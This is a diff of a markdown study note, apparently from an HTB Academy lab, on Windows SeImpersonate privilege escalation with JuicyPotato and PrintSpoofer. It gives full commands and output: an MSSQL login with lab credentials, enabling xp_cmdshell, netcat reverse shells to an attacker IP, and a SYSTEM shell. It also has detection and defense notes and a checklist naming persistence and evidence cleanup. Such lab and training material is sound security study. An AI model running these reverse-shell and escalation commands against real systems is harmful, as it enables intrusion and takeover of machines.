@@ -1,4 +1,4 @@
-# SeImpersonate & SeAssignPrimaryToken Privilege Escalation
+# 🥔 SeImpersonate & SeAssignPrimaryToken
 
 ## 🎯 Overview
 
@@ -7,26 +7,30 @@
 ## 🔑 Token Impersonation Fundamentals
 
 ### Access Token Concepts
-- **Process tokens** contain security context information
-- **Token impersonation** allows assuming another user's identity
-- **SeImpersonatePrivilege** required to utilize stolen tokens
-- **Memory-based attacks** target token locations in process memory
+
+* **Process tokens** contain security context information
+* **Token impersonation** allows assuming another user's identity
+* **SeImpersonatePrivilege** required to utilize stolen tokens
+* **Memory-based attacks** target token locations in process memory
 
 ### Key Privileges
+
 ```cmd
 SeImpersonatePrivilege        # Impersonate client after authentication
 SeAssignPrimaryTokenPrivilege # Replace process level token
 ```
 
 **Common Service Account Context:**
-- IIS application pools
-- SQL Server service accounts  
-- Jenkins execution contexts
-- MSSQL xp_cmdshell execution
+
+* IIS application pools
+* SQL Server service accounts
+* Jenkins execution contexts
+* MSSQL xp\_cmdshell execution
 
 ## 🥔 Potato Attack Family
 
 ### Attack Mechanism
+
 1. **Service account** has SeImpersonatePrivilege but limited SYSTEM access
 2. **Potato attack** tricks SYSTEM process to connect to attacker-controlled process
 3. **Token handover** occurs during connection authentication
@@ -35,11 +39,13 @@ SeAssignPrimaryTokenPrivilege # Replace process level token
 ### JuicyPotato - Legacy Systems
 
 #### Prerequisites
-- **SeImpersonate** OR **SeAssignPrimaryToken** privilege
-- **Windows Server 2016** and earlier (before build 1809)
-- **DCOM/NTLM reflection** capabilities
+
+* **SeImpersonate** OR **SeAssignPrimaryToken** privilege
+* **Windows Server 2016** and earlier (before build 1809)
+* **DCOM/NTLM reflection** capabilities
 
 #### Basic Usage
+
 ```cmd
 # Basic privilege escalation
 JuicyPotato.exe -l [listening_port] -p c:\windows\system32\cmd.exe -a "/c [command]" -t *
@@ -49,19 +55,22 @@ JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 1
 ```
 
 **Parameters:**
-- `-l` - COM server listening port
-- `-p` - Program to launch  
-- `-a` - Arguments passed to program
-- `-t` - CreateProcess call type (* = try both)
+
+* `-l` - COM server listening port
+* `-p` - Program to launch
+* `-a` - Arguments passed to program
+* `-t` - CreateProcess call type (\* = try both)
 
 ### PrintSpoofer - Modern Systems
 
 #### Advantages
-- **Windows Server 2019** and **Windows 10 build 1809+** compatible
-- **Print Spooler service** abuse mechanism
-- **Multiple execution modes** available
+
+* **Windows Server 2019** and **Windows 10 build 1809+** compatible
+* **Print Spooler service** abuse mechanism
+* **Multiple execution modes** available
 
 #### Usage Examples
+
 ```cmd
 # Interactive SYSTEM shell in current console
 PrintSpoofer.exe -i -c cmd
@@ -74,15 +83,17 @@ PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
 ```
 
 ### RoguePotato - Alternative Approach
-- **OXID resolver** abuse technique
-- **Named pipe** impersonation method
-- **Server 2019** and **Windows 10** compatible
+
+* **OXID resolver** abuse technique
+* **Named pipe** impersonation method
+* **Server 2019** and **Windows 10** compatible
 
 ## 💻 Practical Exploitation Scenario
 
 ### SQL Server Service Account Compromise
 
 #### Initial Access via MSSQL
+
 ```bash
 # Connect with mssqlclient.py
 mssqlclient.py sql_dev@10.129.43.30 -windows-auth
@@ -96,6 +107,7 @@ SQL> xp_cmdshell whoami
 ```
 
 #### Privilege Assessment
+
 ```cmd
 SQL> xp_cmdshell whoami /priv
 
@@ -106,6 +118,7 @@ SeManageVolumePrivilege       # Perform volume maintenance tasks - Enabled
 ```
 
 #### JuicyPotato Exploitation
+
 ```cmd
 # Upload JuicyPotato.exe and nc.exe to target
 # Set up listener: nc -lnvp 8443
@@ -121,6 +134,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
 ```
 
 #### PrintSpoofer Alternative
+
 ```cmd
 # Modern Windows systems
 SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
@@ -132,6 +146,7 @@ SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -
 ```
 
 ### Verification
+
 ```cmd
 # Confirm SYSTEM access
 C:\Windows\system32>whoami
@@ -143,23 +158,25 @@ WINLPE-SRV01
 
 ## 🛠️ Tool Comparison
 
-| Tool | OS Support | Method | Reliability |
-|------|------------|--------|-------------|
-| **JuicyPotato** | ≤ Server 2016 | DCOM/NTLM Reflection | High |
-| **PrintSpoofer** | Server 2019+ Win10 1809+ | Print Spooler Service | High |
-| **RoguePotato** | Server 2019+ Win10+ | OXID Resolver | Medium |
-| **SweetPotato** | Universal | Multiple methods | High |
+| Tool             | OS Support               | Method                | Reliability |
+| ---------------- | ------------------------ | --------------------- | ----------- |
+| **JuicyPotato**  | ≤ Server 2016            | DCOM/NTLM Reflection  | High        |
+| **PrintSpoofer** | Server 2019+ Win10 1809+ | Print Spooler Service | High        |
+| **RoguePotato**  | Server 2019+ Win10+      | OXID Resolver         | Medium      |
+| **SweetPotato**  | Universal                | Multiple methods      | High        |
 
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
-- **Target**: `10.129.43.43` (ACADEMY-WINLPE-SRV01)
-- **Credentials**: `sql_dev:Str0ng_P@ssw0rd!`
-- **Objective**: Escalate privileges and retrieve flag
+
+* **Target**: `10.129.43.43` (ACADEMY-WINLPE-SRV01)
+* **Credentials**: `sql_dev:Str0ng_P@ssw0rd!`
+* **Objective**: Escalate privileges and retrieve flag
 
 ### Detailed Step-by-Step Solution
 
 #### 1. Initial Connection with MSSQL
+
 ```bash
 ┌─[us-academy-1]─[10.10.14.143]─[htb-ac330204@pwnbox-base]─[~]
 └──╼ [★]$ mssqlclient.py sql_dev@10.129.43.43 -windows-auth
@@ -177,7 +194,8 @@ Password: Str0ng_P@ssw0rd!
 SQL> 
 ```
 
-#### 2. Enable xp_cmdshell for Command Execution
+#### 2. Enable xp\_cmdshell for Command Execution
+
 ```cmd
 SQL> enable_xp_cmdshell
 
@@ -186,6 +204,7 @@ SQL> enable_xp_cmdshell
 ```
 
 #### 3. Enumerate Privileges - Key Step!
+
 ```cmd
 SQL> xp_cmdshell whoami /priv
 
@@ -213,6 +232,7 @@ NULL
 **✅ Critical Finding**: `SeImpersonatePrivilege` is **Enabled** - this allows privilege escalation!
 
 #### 4. Set Up Reverse Shell Listener (New Terminal)
+
 ```bash
 ┌─[us-academy-1]─[10.10.14.143]─[htb-ac330204@pwnbox-base]─[~]
 └──╼ [★]$ nc -lvnp 8443
@@ -223,6 +243,7 @@ Ncat: Listening on 0.0.0.0:8443
 ```
 
 #### 5. Execute PrintSpoofer Privilege Escalation
+
 ```cmd
 SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "C:\tools\nc.exe 10.10.14.143 8443 -e cmd.exe"
 
@@ -234,6 +255,7 @@ output
 ```
 
 #### 6. Receive SYSTEM Shell
+
 ```bash
 ┌─[us-academy-1]─[10.10.14.143]─[htb-ac330204@pwnbox-base]─[~]
 └──╼ [★]$ nc -lvnp 8443
@@ -250,6 +272,7 @@ C:\Windows\system32>
 ```
 
 #### 7. Verify SYSTEM Access & Retrieve Flag
+
 ```cmd
 C:\Windows\system32>whoami
 nt authority\system
@@ -265,6 +288,7 @@ C:\Windows\system32>type C:\Users\Administrator\Desktop\SeImpersonate\flag.txt
 ### Alternative Methods
 
 #### Using JuicyPotato (for older systems)
+
 ```cmd
 # If PrintSpoofer fails, try JuicyPotato
 SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.143 8443 -e cmd.exe" -t *
@@ -280,6 +304,7 @@ SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.ex
 ### Troubleshooting Common Issues
 
 #### If PrintSpoofer Fails:
+
 ```cmd
 # Try alternative tools based on OS version:
 # Windows Server 2016 and below: JuicyPotato
@@ -287,12 +312,14 @@ SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.ex
 ```
 
 #### If Connection Issues:
+
 ```cmd
 # Verify firewall rules and network connectivity
 # Try different ports: 443, 80, 8080, 9001
 ```
 
 #### If Tools Not Present:
+
 ```cmd
 # Upload tools first (may require web shell or other upload method)
 # Or use PowerShell-based alternatives
@@ -301,6 +328,7 @@ SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.ex
 ## 🔍 Detection Indicators
 
 ### Process Behavior
+
 ```cmd
 # Unusual SYSTEM processes spawned from service accounts
 # COM server listening on high ports
@@ -309,13 +337,15 @@ SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.ex
 ```
 
 ### Event Logs
-- **Event ID 4648** - Explicit credential logon (token impersonation)
-- **Event ID 4672** - Special privileges assigned to logon
-- **Event ID 4624** - Account logon events
+
+* **Event ID 4648** - Explicit credential logon (token impersonation)
+* **Event ID 4672** - Special privileges assigned to logon
+* **Event ID 4624** - Account logon events
 
 ## 🛡️ Defense Strategies
 
 ### Privilege Hardening
+
 ```cmd
 # Remove SeImpersonate from service accounts
 # Implement least-privilege principles
@@ -323,6 +353,7 @@ SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.ex
 ```
 
 ### Detection Rules
+
 ```cmd
 # Monitor for:
 - JuicyPotato.exe execution
@@ -334,24 +365,27 @@ SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.ex
 ## 📋 SeImpersonate Exploitation Checklist
 
 ### Prerequisites
-- [ ] **Service account access** (web shell, SQL, Jenkins)
-- [ ] **SeImpersonatePrivilege** OR **SeAssignPrimaryTokenPrivilege** 
-- [ ] **Tool upload capability** (JuicyPotato/PrintSpoofer)
-- [ ] **Network connectivity** for reverse shells
 
-### Execution Steps  
-- [ ] **Verify privileges** (`whoami /priv`)
-- [ ] **Select appropriate tool** based on OS version
-- [ ] **Upload exploitation binary** to target system
-- [ ] **Set up reverse shell listener** on attack machine
-- [ ] **Execute privilege escalation** command
-- [ ] **Confirm SYSTEM access** (`whoami`)
+* [ ] **Service account access** (web shell, SQL, Jenkins)
+* [ ] **SeImpersonatePrivilege** OR **SeAssignPrimaryTokenPrivilege**
+* [ ] **Tool upload capability** (JuicyPotato/PrintSpoofer)
+* [ ] **Network connectivity** for reverse shells
+
+### Execution Steps
+
+* [ ] **Verify privileges** (`whoami /priv`)
+* [ ] **Select appropriate tool** based on OS version
+* [ ] **Upload exploitation binary** to target system
+* [ ] **Set up reverse shell listener** on attack machine
+* [ ] **Execute privilege escalation** command
+* [ ] **Confirm SYSTEM access** (`whoami`)
 
 ### Post-Exploitation
-- [ ] **Retrieve sensitive data** (flags, credentials)
-- [ ] **Establish persistence** (user creation, services)
-- [ ] **Lateral movement** preparation
-- [ ] **Evidence cleanup** (optional)
+
+* [ ] **Retrieve sensitive data** (flags, credentials)
+* [ ] **Establish persistence** (user creation, services)
+* [ ] **Lateral movement** preparation
+* [ ] **Evidence cleanup** (optional)
 
 ## 💡 Key Takeaways
 
@@ -362,6 +396,6 @@ SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.ex
 5. **Common attack vector** - expect this in most web applications
 6. **High success rate** when prerequisites are met
 
----
+***
 
-*SeImpersonate privilege escalation remains one of the most reliable Windows privilege escalation techniques, particularly in service account compromise scenarios.* 
+_SeImpersonate privilege escalation remains one of the most reliable Windows privilege escalation techniques, particularly in service account compromise scenarios._
